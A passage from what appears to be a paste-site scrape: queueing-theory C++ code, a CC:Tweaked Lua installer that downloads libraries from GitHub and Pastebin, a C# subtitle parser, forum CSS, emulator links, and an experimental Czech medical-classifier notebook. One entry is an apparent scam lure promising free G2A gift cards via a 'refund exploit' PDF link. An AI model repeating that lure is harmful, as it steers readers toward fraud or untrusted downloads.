        p[0] += pow(rho, i) / tgamma(i + 1);
    }
    p[0] += pow(rho, n + 1) / (tgamma(n + 1) * (n - rho));
    p[0] = pow(p[0], -1);
    for (int i = 1; i <= n; ++i) {
        p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
    }
    for (int i = 1; i < 150; ++i) {
        p.push_back(pow(rho, n + i) / (tgamma(n + 1) * pow(n, i)) * p[0]);
    }
    double P_och = pow(rho, n + 1) * p[0] / (tgamma(n + 1) * (n - rho));
    params.push_back({""P_och"", P_och});
    params.push_back({""P_otk"", 0});
    params.push_back({""Q"", 1});
    double A = lmbd;
    params.push_back({""A"", A});
    double L_ob = A / mu;
    params.push_back({""L_ob"", L_ob});
    double L_och = n * P_och / (n - rho);
    params.push_back({""L_och"", L_och});
    params.push_back({""L_syst"", L_ob + L_och});
    params.push_back({""T_ob"", L_ob / lmbd});
    params.push_back({""T_och"", L_och / lmbd});
    params.push_back({""T_syst"", (L_ob + L_och) / lmbd});
    params.push_back({""economic_efficiency"", income_unit * A - expenses_unit * n});

    return params;
}

vector<pair<string, double>> get_params_limited_queue(int n, int m, double mu, double lmbd, double rho, double income_unit, double expenses_unit) {
    vector<pair<string, double>> params;
    vector<double> p = {1};
    for (int i = 1; i <= n; ++i) {
        p[0] += pow(rho, i) / tgamma(i + 1);
    }
    p[0] += pow(rho, n + 1) * (1 - pow(rho / n, m)) / (tgamma(n + 1) * n * (1 - rho / n));
    p[0] = pow(p[0], -1);
    for (int i = 1; i <= n; ++i) {
        p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
    }
    for (int i = 1; i <= m; ++i) {
        p.push_back(pow(rho, n + i) / (tgamma(n + 1) * pow(n, i)) * p[0]);
    }
    double P_och = pow(rho, n + 1) * (1 - pow(rho / n, m)) / (tgamma(n + 1) * n * (1 - rho / n)) * p[0];
    params.push_back({""P_och"", P_och});
    double P_otk = pow(rho, n + m) / (pow(n, m) * tgamma(n + 1)) * p[0];
    params.push_back({""P_otk"", P_otk});
    params.push_back({""Q"", 1 - P_otk});
    double A = lmbd * (1 - P_otk);
    params.push_back({""A"", A});
    double L_ob = A / mu;
    params.push_back({""L_ob"", L_ob});
    double L_och = pow(rho, n + 1) / (n * tgamma(n + 1)) * (1 - pow(rho / n, m) * (m + 1 - m * rho / n)) / pow(1 - rho / n, 2) * p[0];
    params.push_back({""L_och"", L_och});
    params.push_back({""L_syst"", L_ob + L_och});
    params.push_back({""T_ob"", L_ob / lmbd});
    params.push_back({""T_och"", L_och / lmbd});
    params.push_back({""T_syst"", (L_ob + L_och) / lmbd});
    params.push_back({""economic_efficiency"", income_unit * A - expenses_unit * n});

    return params;
}

int main() {
    double t_oj = 7;
    double t_obs = 6.5;
    double mu = 1 / t_obs;
    double lmbd = 1 / t_oj;
    double rho = lmbd / mu;
    double income_unit = 9000;
    double expenses_unit = 300;

    cout << ""mu = "" << mu << endl;
    cout << ""lmbd = "" << lmbd << endl;
    cout << ""t_obs = "" << t_obs << endl;
    cout << ""t_oj = "" << t_oj << endl;
    cout << ""rho = "" << rho << endl;
    cout << ""income_unit = "" << income_unit << endl;
    cout << ""expenses_unit = "" << expenses_unit << endl;

    int n = 1;

    cout << ""n = "" << n << endl;

    n = 3;
    cout << ""n = "" << n << endl;

    auto params_rejections = get_params_rejections(n, mu, lmbd, rho, income_unit, expenses_unit);
    print_params(params_rejections);

    n = 1;
    cout << ""n = "" << n << endl;
    cout << ""rho/n = "" << rho / n << endl;

    auto params_endless_queue_1 = get_params_endless_queue(n, mu, lmbd, rho, income_unit, expenses_unit);
    print_params(params_endless_queue_1);

    n = 4;
    cout << ""n = "" << n << endl;
    cout << ""rho/n = "" << rho / n << endl;

    auto params_endless_queue_4 = get_params_endless_queue(n, mu, lmbd, rho, income_unit, expenses_unit);
    print_params(params_endless_queue_4);

    n = 1;
    int m = 3;
    cout << ""n = "" << n << endl;
    cout << ""m = "" << m << endl;
    cout << ""rho/n = "" << rho / n << endl;

    auto params_limited_queue_1_3 = get_params_limited_queue(n, m, mu, lmbd, rho, income_unit, expenses_unit);
    print_params(params_limited_queue_1_3);

    n = 2;
    m = 4;
    cout << ""n = "" << n << endl;
    cout << ""m = "" << m << endl;
    cout << ""rho/n = "" << rho / n << endl;

    auto params_limited_queue_2_4 = get_params_limited_queue(n, m, mu, lmbd, rho, income_unit, expenses_unit);
    print_params(params_limited_queue_2_4);

    return 0;
}
"
KdwphgtF,Install RSA_Encrypt Lib for CC:Tweaked (ComputerCraft),antl1on,Lua,Sunday 26th of May 2024 03:35:14 PM CDT,"function initBigNumInstall()
	if fs.exists(inst_folder..""BigNum.lua"") then 
		local input = """"
		term.write(""BigNum.lua already exists. Overwrite?(y/n): "")
		input = read()
		while (input ~= ""y"") and input ~= ""Y"" and input ~= ""n"" and input ~= ""N"" do
			term.write(""Invalid option. Input \""y\"" or \""n\"": "")
			input = read()
		end
		if input == ""y"" or input == ""Y"" then
			fs.delete(inst_folder..""BigNum.lua"")
			installBigNum()
		end
	else
		installBigNum()
	end
end

function installBigNum()
	shell.run(""wget https://raw.githubusercontent.com/ennorehling/euler/master/BigNum.lua ""..inst_folder..""BigNum.lua"")
	os.sleep(0.5)
	local bignum_file = fs.open(inst_folder..""BigNum.lua"",""a"")
	bignum_file.write(""\nreturn BigNum"")
	bignum_file.close()
end

function installRSA()
	if fs.exists(inst_folder..""RSA.lua"") then 
		local input = """"
		term.write(""RSA.lua already exists. Overwrite?(y/n): "")
		input = read()
		while (input ~= ""y"") and input ~= ""Y"" and input ~= ""n"" and input ~= ""N"" do
			term.write(""Invalid option. Input \""y\"" or \""n\"": "")
			input = read()
		end
		if input == ""y"" or input == ""Y"" then
			fs.delete(inst_folder..""RSA.lua"")
			shell.run(""pastebin get BckQ1JyV ""..inst_folder..""RSA.lua"")
		end
	else
		shell.run(""pastebin get BckQ1JyV ""..inst_folder..""RSA.lua"")
	end
end

term.write(""Installation Folder?: "")
inst_folder = read()
if inst_folder:sub(#inst_folder,#inst_folder) ~= ""/"" then
	inst_folder = inst_folder..""/""
end

initBigNumInstall()
installRSA()

term.setTextColor(colors.green)
print(""Installation finished successfully. Press any key to close this installer"")
os.pullEvent(""key"")
term.setTextColor(colors.white)"
h98anim6,Parsing subtitle using AngleSharp/State tecni,ivandrofly,C#,Sunday 26th of May 2024 03:31:48 PM CDT,"// Parsing JacoSub (subtitle edit)

private struct ParseData
        {
            public TimeSpan StartTime { get; set; }
            public TimeSpan EndTime { get; set; }
        }

        Paragraph Paragraph(string line)
        {
            return StartTime(line, 0);
        }

        Paragraph StartTime(string line, int position)
        {
            var parseData = new ParseData();
            // H:MM:SS.FF H:MM:SS.FF directive {comment} text {comment} more text...
            if (position + 10 < line.Length)
            {
                var timestamp = line.Substring(position, 10);
                parseData.StartTime = TimeSpan.ParseExact(timestamp, ""H:MM:SS.FF"", CultureInfo.CurrentCulture);
                return EndTime(line, position + 10, ref parseData); // read the time cod from 10 index
            }

            return null;
        }

        Paragraph EndTime(string line, int position, ref ParseData parseData)
        {
            // H:MM:SS.FF H:MM:SS.FF directive {comment} text {comment} more text...
            while (position < line.Length && line[position] == ' ') position++;

            if (position + 10 < line.Length)
            {
                var timestamp = line.Substring(position, 10);
                parseData.EndTime = TimeSpan.ParseExact(timestamp, ""H:MM:SS.FF"", CultureInfo.CurrentCulture);
                return EndTime(line, position + 10, ref parseData); // read the time cod from 10 index
            }

            return null;
        }

        Paragraph Text(string line, int position, ref ParseData token)
        {
            // H:MM:SS.FF H:MM:SS.FF directive {comment} text {comment} more text...
            if (position + 1 < line.Length)
            {
                return new Paragraph()
                {
                    StartTime = new TimeCode(token.StartTime.TotalMilliseconds),
                    EndTime = new TimeCode(token.EndTime.TotalMilliseconds),
                    Text = line.Substring(position).TrimStart()
                };
            }

            return null;
        }"
hWMQv5fK,Confetti Signature,NirvanaDeaerum,CSS,Sunday 26th of May 2024 03:19:14 PM CDT,"<div class=""cnftiii""><div class=""cnfxkp""><a href=""https://nirvanadearum.tumblr.com/"" title=""Nirvana""></a></div><div class=""cnfxim""><img src=""https://dummyimage.com/250x250/8c2679/fff.png""></div><div class=""iknzz""><a href=""/u1"" target=""_blank""><em class=""ri-user-heart-fill"" title=""Perfil""></em></a><a href=""/privmsg?mode=post&u=1"" target=""_blank""><em class=""ri-mail-star-line"" title=""MP""></em></a><em class=""ri-font-sans"" title=""Ficha""></em><em class=""ri-heart-add-fill"" title=""Relationships""></em><em class=""ri-time-line"" title=""Cronolog√≠a""></em><em class=""ri-archive-2-line"" title=""Ba√∫l""></em><em class=""ri-smartphone-line"" title=""Phone""></em><em class=""ri-instagram-line"" title=""Instagram""></em><em class=""ri-twitter-x-line"" title=""Twitter""></em></div><div class=""pjnm""><b>Na</b>me <b>of</b> Cute <b>PJ</b></div></div>

<link href=""https://dl.dropbox.com/scl/fi/z6kaxysz8s6xwm4tr2s0z/confeti.css?rlkey=anz63q2c8nb3tp8j1xcw89nbt&st=v605mbpl&dl=0"" rel=""stylesheet""><link href=""https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css"" rel=""stylesheet"">

<style>:root{--whyt:rgba(1,1,1,1); --bluu1:#3a0000; --shdw1:rgba(178, 92, 92, .82); --shdw2:rgba(149, 118, 113, .75); --shdw3:rgb(185, 51, 51); --shdw4:rgba(151, 0, 0, 1); --drp1:rgba(67, 67, 67, .3); --drp2:rgba(255, 0, 0, .25); --drk1:rgba(41, 41, 41,1); --ktrs:#a40000;}</style>"
YcF905F2,Emulator Stuff,baller69420,GetText,Sunday 26th of May 2024 03:02:25 PM CDT,"Emulator Links

IMPORTANT: Always scan downloads with https://virustotal.com first before running. You also need a NASA Computer to run some of these.

Suyu (Nintendo Switch Emulator - Yuzu Fork. RIP Yuzu): https://github.com/suyu-emu/suyu
Mesen [Second Ver.] (NES, SNES, Game Boy (Color), Game Boy Advance, PC Engine and SMS Emulator): https://www.mesen.ca/
Mupen64+ (N64 Emulator - Don't use project64): https://github.com/mupen64plus/mupen64plus-core/releases/tag/2.5.9
Dolphin (Wii, Gamecube Emulator - Eat eggs): https://dolphin-emu.org/
Bizhawk (Holy shid it emulates way too many consoles): https://tasvideos.org/Bizhawk
mGBA (Game Boy Advance [duh] Emulator): https://mgba.io/
xemu (XBOX LIIIIIVVVEEEE! - Xbox Emulator): https://xemu.app/
Xenia (The only Xbox 360 Emulator on the Internet...I'm not joking - Xbox 360 Emulator): https://xenia.jp/

And Finally

Retroarch (Why use one emulator that supports one or two consoles when you can emulate ALL OF THEM - Everything that can be emulated emulator): https://store.steampowered.com/app/1118310/RetroArch/



Go eat eggs

"
vFBZbSqm,üéâG2A.com Free Gift Card Guide May 2024üî•,Alfonso1119,GetText,Sunday 26th of May 2024 03:00:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4691089.pdf

Working as of:

26 May 2024"
9MJTvFh2,final VK ok vse,max2201111,Python,Sunday 26th of May 2024 02:58:00 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlƒçou≈°ek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     # Now, normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(image[:, -1])
#     max_pixel_value = np.max(image[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Now, normalize the last column separately to achieve grayscale


#         min_pixel_value = np.min(data[:, -1])
#         max_pixel_value = np.max(data[:, -1])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Normalize the last column separately to achieve grayscale
#         min_pixel_value = np.min(data[i])
#         max_pixel_value = np.max(data[i])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value_last = np.min(data[:, -1])
#     max_pixel_value_last = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
#         image[i, -1] = np.array([pixel_value_last] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


#     print(""**************************"",num_training_rows,""*******************"")

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     # for i, label in enumerate(y_train):
#     #     for j in range(len(X_train[0])
#     #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#     #         image_training[i, j] = np.array([pixel_value] * 3)
#     #         image_training[i, -1] = np.array([128, 128, 128])
#     #     if label == 0:
#     #         image_training[i, -1] = np.array([0, 128, 0])
#     #     elif label == 1:
#     #         image_training[i, -1] = np.array([255, 0, 0])



#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for i, label in enumerate(y_train):
#         for j in range(len(X_train[0])):
#             pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#         if label == 0:
#             image_training[i, -1] = np.array([0, 128, 0])
#         elif label == 1:
#             image_training[i, -1] = np.array([255, 0, 0])


#     return image_training








# def create_imageN(data, predictions, label_colors=None):
#     num_training_rows = 1  # Set the number of rows to 1
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for j in range(len(X_train[0])):
#         pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[0, j] = np.array([pixel_value] * 3)

#     image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

#     label = y_train[0]
#     if label == 0:
#         image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
#     elif label == 1:
#         image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

#     return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento k√≥d otev≈ôe dialogov√© okno pro v√Ωbƒõr souboru z va≈°eho poƒç√≠taƒçe.
import io
import pandas as pd

# P≈ôedpokl√°d√°me, ≈æe jste nahr√°li CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, kter√© pot≈ôebuj√≠ b√Ωt ƒçteny jako bin√°rn√≠ objekty
  df = pd.read_csv(path)
  print(df.head())  # Vyp√≠≈°e prvn√≠ch pƒõt ≈ô√°dk≈Ø DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# P≈ôevod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
